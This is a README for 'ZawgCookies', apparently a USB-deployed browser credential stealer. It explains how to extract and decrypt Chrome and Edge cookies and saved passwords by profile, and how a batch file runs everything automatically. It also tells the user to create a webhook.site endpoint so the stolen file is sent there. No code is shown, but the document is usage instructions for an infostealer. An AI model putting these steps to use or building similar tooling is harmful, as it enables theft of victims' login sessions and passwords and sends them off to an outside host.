## IMPORTANT
-- IMPORTANT -- Make an webhook at webhook.site, as it's the easiest way to send the file. Replace the webhook line or use ReplaceWebhook.bat

# ZawgCookies aka ZawgBrowsers

## Credits
Original project(s): thewh1teeagle, for rookie, pkptzx, for chrome_Cookies, and justjavac, for chrome_password.rs
<br>

cookies - modified fork of rookie.rs https://github.com/thewh1teagle/rookie           
passwords - modified fork of chrome_cookies to decrypt passwords instead https://github.com/pkptzx/chrome_cookies/  
passwordsalt - forked from chrome.passwords.rs https://github.com/justjavac/chrome_password.rs  

## How to use

to use cookies, -c does Default profile, -e does Default profile on edge, -cp1 does Profile 1 on Chrome, and -ep1 does Profile 1 on Edge.
to use passwords, it's the same as cookies but for passwords.
passwordsalt just spits out the passwords from the Default profile into the CMD window.

When using Run.bat, it should automatically do everything for you, no downloads, no nothing, the bat file does it all.
Once finished, check back at webhook.site and the output should be there.
If you want to use Edge, you can modify -c to be -e, and if you want Profile 1, then do -cp1, for edge it's the same but -ep1.


The Utils folder holds Utils.bat. The Utils.bat file has 4 options. You can shutdown an computer after a specified amount of time, look at system info and IP info, and convert the netscape cookies.
<br>
To convert the cookies, enter the path to your cookies file. 
<br> 
<br>
-- The batch file has to be on either the root of the usb or in the Utils folder --
<br>
<br>
It should automatically convert the cookies 
<br>
<br>
-- Make sure you have python installed and in path --
<br>
<br>
and it will tell you if you want to open the folder with the converted cookies.
